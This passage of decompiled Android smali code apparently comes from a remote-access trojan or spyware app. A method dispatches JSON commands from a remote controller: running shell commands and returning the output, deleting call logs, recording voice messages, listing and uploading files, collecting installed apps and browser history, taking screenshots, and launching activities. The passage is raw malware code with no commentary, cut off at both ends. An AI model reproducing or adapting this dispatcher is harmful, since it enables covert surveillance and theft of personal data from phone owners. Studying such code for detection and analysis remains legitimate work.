    const/high16 v1, 0x10000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x40000000    # 2.0f

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-static {}, Lio/realm/Realm;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-object v14

    :cond_14
    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_15

    const-string v1, "command"

    invoke-virtual {v10, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v1, v2}, Lo/a/a/e/b;->a(Ljava/lang/String;Z)Lo/a/a/e/b$a;

    move-result-object v1

    iget v2, v1, Lo/a/a/e/b$a;->a:I

    if-nez v2, :cond_1c

    iget-object v1, v1, Lo/a/a/e/b$a;->b:Ljava/lang/String;

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v2, v12, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    return-object v14

    :cond_15
    const-string v0, "deletecalls"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_16

    goto :goto_1

    :cond_16
    const-string v0, "voice_message"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_17

    goto :goto_1

    :cond_17
    const-string v0, "get_list_file"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_18

    goto :goto_1

    :cond_18
    const-string v0, "upload_file_path"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_19

    goto :goto_1

    :cond_19
    const-string v0, "application_list"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1a

    goto :goto_1

    :cond_1a
    const-string v0, "browser_history"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1b

    goto :goto_1

    :cond_1b
    const-string v0, "get_screenshot"

    invoke-static {v11, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z
    :try_end_5
    .catch Lorg/json/JSONException; {:try_start_5 .. :try_end_5} :catch_0

    :cond_1c
    :goto_1
    return-object v15

    :catch_0
    move-exception v0

    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method
